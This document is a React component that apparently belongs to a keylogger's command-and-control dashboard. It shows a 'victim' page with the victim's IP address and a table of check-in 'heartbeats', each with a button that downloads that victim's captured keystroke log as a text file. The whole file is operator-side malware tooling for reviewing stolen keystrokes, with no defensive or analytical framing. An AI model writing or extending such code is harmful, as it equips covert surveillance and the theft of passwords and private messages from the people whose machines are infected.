import React, { useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import api from '../api';

const VictimDetail = () => {
  const { id } = useParams();
  const [victim, setVictim] = useState(null);

  useEffect(() => {
    api.get(`/v1/victims/${id}`)
      .then(res => {
        setVictim(res.data);
        console.log(res.data);
      })
      .catch(err => console.error(err));
  }, [id]);

  const handleDownload = (heartbeatId) => {
    api.get(`/v1/heartbeat/file/${heartbeatId}`, { responseType: 'blob' })
      .then(res => {
        const fileURL = window.URL.createObjectURL(new Blob([res.data]));
        const link = document.createElement('a');
        link.href = fileURL;
        link.setAttribute('download', `keylog_${heartbeatId}.txt`);
        document.body.appendChild(link);
        link.click();
        link.remove();
      })
      .catch(err => {
        console.error('Error downloading file:', err.response);
      });
  };

  if (!victim) return <p>Loading...</p>;

  return (
    <div className="container mt-4">
      <h2>Victim Detail</h2>
      <p><strong>IP Address:</strong> {victim.ipAddress}</p>

      <h3>Heartbeats</h3>
      <table className="table table-striped table-bordered">
        <thead className="table-dark">
          <tr>
            <th>ID</th>
            <th>Timestamp</th>
            <th>Keylog File</th>
          </tr>
        </thead>
        <tbody>
          {victim.heartbeats?.map(h => (
            <tr key={h.id}>
              <td>{h.id}</td>
              <td>{new Date(h.timestamp).toLocaleString()}</td>
              <td>
                <button
                  onClick={() => handleDownload(h.id)}
                  className="btn btn-sm btn-primary"
                >
                  Download
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {/* <Link to={`/victim/${id}/keylogs`} className="btn btn-outline-secondary mt-3">
        View All Keylogs
      </Link> */}
    </div>
  );
};

export default VictimDetail;
